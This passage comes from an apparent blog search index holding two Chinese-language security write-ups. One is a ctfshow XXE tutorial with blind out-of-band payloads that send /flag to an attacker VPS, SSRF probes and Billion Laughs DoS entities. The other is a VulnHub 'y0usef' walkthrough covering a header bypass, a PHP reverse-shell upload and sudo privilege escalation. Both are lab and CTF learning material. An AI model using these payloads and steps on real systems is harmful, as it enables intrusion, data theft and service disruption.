<p>注意，这里面的三个实体都是字符串形式，连在一起居然报错了，这说明我们不能在 xml 中进行拼接，而是需要在拼接以后再在xml 中调用，那么要想在 DTD 中拼接，我们知道我们只有一种选择，就是使用参数实体</p>
</blockquote>
<p>那我们把我们的读出来的数据放在 CDATA 中输出就能进行绕过</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE roottag [</span><br><span class="line">    &lt;!ENTITY % start &quot;&lt;![CDATA[&quot;&gt;</span><br><span class="line">    &lt;!ENTITY % goodies SYSTEM &quot;file:///d:/test.txt&quot;&gt;</span><br><span class="line">    &lt;!ENTITY % end &quot;]]&gt;&quot;&gt;</span><br><span class="line">    &lt;!ENTITY % dtd SYSTEM &quot;http://ip/evil.dtd&quot;&gt;</span><br><span class="line">    %dtd;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;roottag&gt;&amp;all;&lt;/roottag&gt;</span><br></pre></td></tr></table></figure>

<p><strong>evil.dtd</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt; </span><br><span class="line">&lt;!ENTITY all &quot;%start;%goodies;%end;&quot;&gt;</span><br></pre></td></tr></table></figure>

<p>解释：</p>
<p><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</code>：指定XML版本为1.0，字符编码为UTF-8。</p>
<p><code>&lt;!DOCTYPE roottag [...]&gt;</code>：定义了名为”roottag”的根元素，并在内部包含了一组实体定义。</p>
<p><code>&lt;!ENTITY % start &quot;&lt;![CDATA[&quot;&gt;</code>：定义了名为”start”的参数实体，内容为”&lt;![CDATA[“，用于表示CDATA块的起始部分。</p>
<p><code>&lt;!ENTITY % goodies SYSTEM &quot;file:///d:/test.txt&quot;&gt;</code>：定义了名为”goodies”的参数实体，指向本地文件”d:&#x2F;test.txt”，用于引入外部实体内容。</p>
<p> <code>&lt;!ENTITY % end &quot;]]&gt;&quot;&gt;</code>：定义了名为”end”的参数实体，内容为”]]&gt;”,用于表示CDATA块的结束部分。</p>
<p> <code>&lt;!ENTITY % dtd SYSTEM &quot;http://ip/evil.dtd&quot;&gt;</code>：定义了名为”dtd”的参数实体，指向远程DTD文件”<code>http://ip/evil.dtd</code>“。<br> <code>%dtd;</code>：在DOCTYPE声明中引用了”dtd”参数实体，将远程DTD文件的内容插入到文档中。</p>
<p> <code>&lt;roottag&gt;&amp;all;&lt;/roottag&gt;</code>：XML文档的根元素为”roottag”，其中引用了名为”all”的通用实体，从而达到拼接的目的。</p>
<p>第二个XML代码片段中的<code>evil.dtd</code>文件定义了一个名为<code>all</code>的通用实体，其内容为<code>%start;%goodies;%end;</code>，表示<code>all</code>实体由<code>start</code>、<code>goodies</code>和<code>end</code>三个实体组成。</p>
<h5 id="无回显读敏感文件："><a href="#无回显读敏感文件：" class="headerlink" title="无回显读敏感文件："></a>无回显读敏感文件：</h5><p>本题为 ctfshow web 374 题的源码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2021-01-07 12:59:52</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2021-01-07 13:36:47</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">libxml_disable_entity_loader</span>(<span class="literal">false</span>);</span><br><span class="line"><span class="variable">$xmlfile</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$xmlfile</span>))&#123;</span><br><span class="line">    <span class="variable">$dom</span> = <span class="keyword">new</span> <span class="title class_">DOMDocument</span>();</span><br><span class="line">    <span class="variable">$dom</span>-&gt;<span class="title function_ invoke__">loadXML</span>(<span class="variable">$xmlfile</span>, LIBXML_NOENT | LIBXML_DTDLOAD);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure>

<p>相比较于上一道有回显的题目，差别在于删除了如下代码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$ctfshow</span> = <span class="variable">$creds</span>-&gt;ctfshow;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$ctfshow</span>;</span><br></pre></td></tr></table></figure>

<p>我们的做法是将flag外带</p>
<p><del>由于新人第一次接触反弹Shell的做法，就将接下来的步骤写的详细一些了</del></p>
<p>如果是腾讯云的vps，要现在防火墙将所有端口开放</p>
<p><img src="/picture/t3vQkyRPYEoSFOI.png" alt="image-20240313173756361"></p>
<p>启动vps后在特定宽口开放http服务，以便通过外网能访问到你的恶意文件：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 -m http.server </span><br></pre></td></tr></table></figure>

<p>此时我们访问一下 <a href="http://vps-ip:8000/">http://vps-ip:8000</a> 试试看：（未有特殊说明则默认开放8000端口，ip为vps公网的ip）</p>
<p><img src="/picture/q4QxSDGbpXnMOEv.png" alt="image-20240313153456749"></p>
<p>此时</p>
<p><img src="/picture/AyUs89x3OrngBFe.png" alt="image-20240313154259477"></p>
<p>说明8000端口启动http服务成功</p>
<p>同理我们来测试1234端口：</p>
<p><img src="/picture/A6UcgXZFuofS2Bv.png" alt="image-20240313154326926"></p>
<p>说明1234端口也启动http服务成功</p>
<p>创建XXE.dtd文件并写入如下内容：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vim XXE.dtd</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#XXE.dtd</span><br><span class="line">#shift+i</span><br><span class="line">&lt;!ENTITY % all &quot;&lt;!ENTITY &amp;#x25; send  SYSTEM &#x27;http://vps-ip:1234/%file;&#x27;&gt; &quot;&gt;</span><br><span class="line">%all;</span><br><span class="line">%send;</span><br><span class="line">#esc</span><br><span class="line">#shift+: 输入wq保存退出</span><br></pre></td></tr></table></figure>

<p>在另一个页面监听本地1234端口：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nc -lvnp 1234</span><br></pre></td></tr></table></figure>

<p><img src="/picture/czXb29IgDC4wZFL.png" alt="image-20240313154810747"></p>
<p>burp发包内容：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: 2299db75-d9fe-416f-959d-406b131ae701.challenge.ctf.show</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.85 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE test [</span><br><span class="line">&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=/flag&quot;&gt;</span><br><span class="line">&lt;!ENTITY % dtd SYSTEM &quot;http://vps-ip:8000/XXE.dtd&quot;&gt;</span><br><span class="line">%dtd;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure>

<p><img src="/picture/G4Q5JhVHnozk1M6.png" alt="image-20240313161738958"></p>
<p>在监听的页面就可以看到加密后的flag</p>
<p><img src="/picture/R24VpE8F6yLnZdC.png" alt="image-20240313155739020"></p>
<p>解密后得到flag</p>
<p><img src="/picture/VBZqvXIb3kepYiA.png" alt="image-20240313155848778"></p>
<p>对payload的解释：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE test [</span><br><span class="line">&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=/flag&quot;&gt;</span><br><span class="line">&lt;!ENTITY % dtd SYSTEM &quot;http://vps-ip:8000/XXE.dtd&quot;&gt;</span><br><span class="line">%dtd;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure>

<p>定义了两个实体：</p>
<ol>
<li><p><code>%file</code>：它使用php过滤器读取系统文件<code>/flag</code>的内容，并对内容进行base64编码。</p>
</li>
<li><p><code>%dtd</code>：它从远程URL <code>http://vps-ip:8000/XXE.dtd</code>加载DTD文件。</p>
</li>
</ol>
<p>以下是jay17师傅的解释（实体名有所改动）：</p>
<ol>
<li>不能直接<code>&lt;!ENTITY % dtd SYSTEM &quot;http://vps-ip:8000/%file&quot;&gt; </code>，因为默认不允许把本地文件发送到远程dtd里面，需要绕一圈，绕过这个限制</li>
<li><code>%dtd;</code>会读取远程dtd文件，读到了以后，因为远程dtd文件有一个<code>% all</code>实体的定义，那么就会解析这个实体定义。<code>% all</code>实体的定义内容是另外一个实体<code>% send</code>定义，那就会解析<code>% send</code>，就会执行远程请求，请求地址<code>http://vps-ip:8000/%file</code>，会在我们的 vps 日志上留下痕迹。<br>也可以起 nc 监听端口，能判断是否有向我们的 vps 发送请求以及请求内容。</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY % all &quot;&lt;!ENTITY &amp;#x25; send  SYSTEM &#x27;http://vps-ip:1234/%file;&#x27;&gt; &quot;&gt;</span><br><span class="line">%all;</span><br><span class="line">%send;</span><br></pre></td></tr></table></figure>

<ol>
<li><code>&amp;#x25;</code> 就是百分号，因为是嵌套在里面的引用，不能直接写百分号</li>
<li><code>%all</code>实体定义了一个新的实体<code>send</code>，其内容是一个SYSTEM类型的实体，用于发送数据到指定的URL。在这里，<code>%file</code>实体被引用在URL中，以便将<code>/flag</code>文件的内容发送到指定的<code>http://vps-ip:1234/</code>地址。</li>
<li>在XML文档的解析过程中，通过引用<code>%all</code>实体，实际上定义了一个名为<code>send</code>的实体，其值是将<code>/flag</code>文件内容发送到指定URL的操作。</li>
<li>最后，通过引用<code>%send</code>实体，实际上执行了之前定义的<code>send</code>实体，将<code>/flag</code>文件的内容发送到指定的URL。</li>
</ol>
<h3 id="XXE检测："><a href="#XXE检测：" class="headerlink" title="XXE检测："></a>XXE检测：</h3><p>主要的方法是检测所有接受XML作为输入内容端点，抓包观察其是否会返回我们想要的内容。</p>
<p>首先检测XML是否会被成功解析：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE ANY [ </span><br><span class="line">    &lt;!ENTITY words &quot;Hello XXE !&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;root&gt;&amp;words;&lt;/root&gt;</span><br></pre></td></tr></table></figure>

<p><img src="/picture/zScwHxmoaDt2hqJ.png" alt="image-20231008194425489"></p>
<p>如果数据包或页面中存在“Hello XXE”的字样，则表名实体已被解析。</p>
<p><img src="/picture/WV5Z1hPgBNuRQU3.png" alt="image-20231008194500250"></p>
<p>接下来检测该端点是否支持DTD引用外部实体：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=”1.0” encoding=”UTF-8”?&gt;</span><br><span class="line">&lt;!DOCTYPE ANY [</span><br><span class="line">    &lt;!ENTITY % name SYSTEM &quot;http://localhost/tp5/test.xml&quot;&gt;</span><br><span class="line">    %name;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure>
<p>此时通过查看自己服务器上的日志来判断，看目标服务器是否向你的服务器发了一条请求test.xml的HTTP request。</p>
<p><img src="/picture/OxmH3Qjp9ahRWPK.png" alt="image-20231008210523538"></p>
<p>如图所示，则该处很可能存在XML外部实体注入漏洞。</p>
<h3 id="SSRF："><a href="#SSRF：" class="headerlink" title="SSRF："></a>SSRF：</h3><p>XXE 可以与SSRF（服务端请求伪造） 漏洞一起用于探测其它内网主机的信息，基于http协议。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE foo [</span><br><span class="line">    &lt;!ELEMENT foo ANY &gt;</span><br><span class="line">    &lt;!ENTITY % xxe SYSTEM &quot;http://internal.service/secret_pass.txt&quot; &gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;foo&gt;&amp;xxe;&lt;/foo&gt;</span><br></pre></td></tr></table></figure>
<p>当然也可以用来探测端口信息，根据响应包的信息，若非“connection refused”则表示该端口可能是开放的。</p>
<p>众所周知，有些企业对内网的安全性可能不那么注重。除了以上的利用，控制服务器对外网发送请求也是有可能成功的。此处可使用ncat工具进行测试。关于ncat的使用：ncat-网络工具中的“瑞士军刀”</p>
<p>用ncat在自己的服务器上开启监听：ncat -lvkp 8081(端口可自定义)</p>
<p>之后便可使用以下语句尝试是否能够建立连接：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE data SYSTEM &quot;http://ATTACKERIP:8081/&quot; [</span><br><span class="line">    &lt;!ELEMENT data (#PCDATA)&gt;  </span><br><span class="line">]&gt;</span><br><span class="line">&lt;data&gt;4&lt;/data&gt;</span><br></pre></td></tr></table></figure>

<h3 id="DDoS："><a href="#DDoS：" class="headerlink" title="DDoS："></a>DDoS：</h3><p>支持实体测试：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE data [</span><br><span class="line">    &lt;!ELEMENT data (#ANY)&gt;</span><br><span class="line">    &lt;!ENTITY a0 &quot;dos&quot; &gt;</span><br><span class="line">    &lt;!ENTITY a1 &quot;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&quot;&gt;</span><br><span class="line">    &lt;!ENTITY a2 &quot;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;data&gt;&amp;a2;&lt;/data&gt;</span><br></pre></td></tr></table></figure>
<p>如果解析过程变的非常缓慢，则表明测试成功，即目标解析器配置不安全可能遭受至少一种 DDoS 攻击。</p>
<h3 id="Billion-Laughs-攻击："><a href="#Billion-Laughs-攻击：" class="headerlink" title="Billion Laughs 攻击："></a>Billion Laughs 攻击：</h3><p>一个经典的Dos攻击payload：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE lolz [</span><br><span class="line">    &lt;!ENTITY lol &quot;lol&quot;&gt;</span><br><span class="line">    &lt;!ELEMENT lolz (#PCDATA)&gt;</span><br><span class="line">    &lt;!ENTITY lol1 &quot;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&quot;&gt; </span><br><span class="line">    &lt;!ENTITY lol2 &quot;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&quot;&gt;</span><br><span class="line">    &lt;!ENTITY lol3 &quot;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&quot;&gt;</span><br><span class="line">        ...... </span><br><span class="line">    &lt;!ENTITY lol9 &quot;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;lolz&gt;&amp;lol9;&lt;/lolz&gt;</span><br></pre></td></tr></table></figure>
<p>当XML解析器加载该文档时，它会看到它包含一个根元素 “lolz” ，该元素包含文本 “&lol9;” 。然而，“&lol9;” 是一个已定义的实体，它扩展为包含十个 “&lol8;” 字符串。每个 “&lol8;” 字符串都是一个已定义的实体，可以扩展到10个 “&lol7;” 字符串，以此类推。在处理完所有的实体扩展之后，这个小（小于1 KB）的XML块实际上将包含 109 &#x3D; 10亿个 “lol” ，占用了将近 3 gb 的内存。</p>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://www.w3school.com.cn/dtd/dtd_intro.asp">DTD 简介 (w3school.com.cn)</a></p>
<p><a href="https://xz.aliyun.com/t/3357?time__1311=n4+xnD0DgGYQwqYq40HpDUhG+KG=DceorD3D&alichlgref=https://xz.aliyun.com/t/3357#toc-8">一篇文章带你深入理解漏洞之 XXE 漏洞 - 先知社区 (aliyun.com)</a></p>
<p><a href="https://zhuanlan.zhihu.com/p/389550468">XXE知识总结，有这篇就够了！ - 知乎 (zhihu.com)</a></p>
<p><a href="https://blog.csdn.net/Jayjay___/article/details/132146130">Ctfshow web入门 XXE 模板注入篇 web373-web378 详细题解 全_ctfshow web373-CSDN博客</a></p>
<p><a href="https://blog.csdn.net/uuzeray/article/details/134641792">【Web】CTFSHOW XXE刷题记录(全)-CSDN博客</a></p>
]]></content>
      <categories>
        <category>XXE</category>
      </categories>
      <tags>
        <tag>XXE</tag>
        <tag>ctfshow</tag>
        <tag>reverse shell</tag>
      </tags>
  </entry>
  <entry>
    <title>y0usef Walkthrough</title>
    <url>/2025/03/29/y0usef/</url>
    <content><![CDATA[<h1 id="y0usef-Walkthrough"><a href="#y0usef-Walkthrough" class="headerlink" title="y0usef Walkthrough"></a>y0usef Walkthrough</h1><h2 id="Box-Info"><a href="#Box-Info" class="headerlink" title="Box Info"></a>Box Info</h2><p>官网在这里：[y0usef: 1](<a href="https://www.vulnhub.com/entry/y0usef-1,624/">y0usef: 1 ~ VulnHub</a>)</p>
<p><img src="/picture/image-20250329154643794.png" alt="image-20250329154643794"></p>
<h2 id="The-Hack"><a href="#The-Hack" class="headerlink" title="The Hack"></a>The Hack</h2><p>先对目标主机做端口发现</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo nmap -p- 172.16.33.74</span><br></pre></td></tr></table></figure>

<p>目标主机开放 22、80 端口</p>
<p><img src="/picture/image-20250329150831393.png" alt="image-20250329150831393"></p>
<p>对开放的端口进行应用版本发现</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo nmap -p22,80 -A -T4 172.16.33.74</span><br></pre></td></tr></table></figure>

<p>22 端口开放 SSH 服务，80 端口开放 http 服务</p>
<p><img src="/picture/image-20250329150903703.png" alt="image-20250329150903703"></p>
<p>先来看 22 端口，尝试弱口令登陆，同时看看能不能泄露机密信息</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh root@172.16.33.74</span><br></pre></td></tr></table></figure>

<p>可惜失败了，再来看 80 端口，进行目录扫描</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dirsearch -u http://172.16.33.74</span><br></pre></td></tr></table></figure>

<p>发现 &#x2F;adminstration 目录</p>
<p><img src="/picture/image-20250329151251819.png" alt="image-20250329151251819"></p>
<p>对 &#x2F;adminstration 目录进一步扫描</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dirsearch -u http://172.16.33.74/adminstration</span><br></pre></td></tr></table></figure>

<p>发现了很多目录，但是除了 &#x2F;adminstration&#x2F;include&#x2F; 都是 404</p>
<p><img src="/picture/image-20250329151833451.png" alt="image-20250329151833451"></p>
<p>访问 &#x2F;adminstration&#x2F;include ，发现两个文件，访问文件没有报错或者禁止访问，但是没有内容</p>
<p>尝试添加 XFF 头指向 localhost 在进行访问，发现 &#x2F;adminstration 页面变化为登陆界面，弱口令 admin&#x2F;admin 即可进入后台</p>
<p><img src="/picture/image-20250329152223913.png" alt="image-20250329152223913"></p>
<p>上传文件，为 MIME 类型检测，将 PHP 木马的 Content-Type 更改为 image&#x2F;jpg 即可上传成功</p>
<p><img src="/picture/image-20250329152351345.png" alt="image-20250329152351345"></p>
<p>访问上传的文件 &#x2F;adminstration&#x2F;upload&#x2F;files&#x2F;1668608420php-reverse-shell.php ，同时开启 nc 监听，即可接收到回弹的 shell</p>
<p><img src="/picture/image-20250329152620389.png" alt="image-20250329152620389"></p>
<p>获得 TTY shell</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 -c &quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span><br></pre></td></tr></table></figure>

<p>查看已登录用户</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat /etc/passwd | grep bash</span><br></pre></td></tr></table></figure>

<p>切换至 home 目录，查看有哪些用户主目录可以访问，却发现 user.txt</p>
<p>··<img src="/picture/image-20250329153005316.png" alt="image-20250329153005316"></p>
<p>查看 user.txt 发现是加密后数据，解密后为</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh : </span><br><span class="line">user : yousef </span><br><span class="line">pass : yousef123</span><br></pre></td></tr></table></figure>

<p>使用 SSH 远程登陆 yousef 账户</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh yousef@172.16.33.74</span><br></pre></td></tr></table></figure>

<p><img src="/picture/image-20250329153710818.png" alt="image-20250329153710818"></p>
<p>查看有哪些文件具有 SUID 权限</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br></pre></td></tr></table></figure>

<p>发现 sudo 竟然有 SUID 权限，由于先前知道 yousef 的 SSH 密码，是否存在密码复用？</p>
<p><img src="/picture/image-20250329153937600.png" alt="image-20250329153937600"></p>
<p>尝试使用 sudo 提权</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo sudo /bin/sh</span><br></pre></td></tr></table></figure>

<p>输入密码 yousef123，竟然成功了</p>
<p><img src="/picture/image-20250329154038217.png" alt="image-20250329154038217"></p>
<p>直接获得 flag</p>
<p><img src="/picture/image-20250329154135436.png" alt="image-20250329154135436"></p>
]]></content>
      <categories>
        <category>Penetration Testing</category>
      </categories>
      <tags>
        <tag>Penetration Testing</tag>
        <tag>vulnhub</tag>
      </tags>
  </entry>
</search>
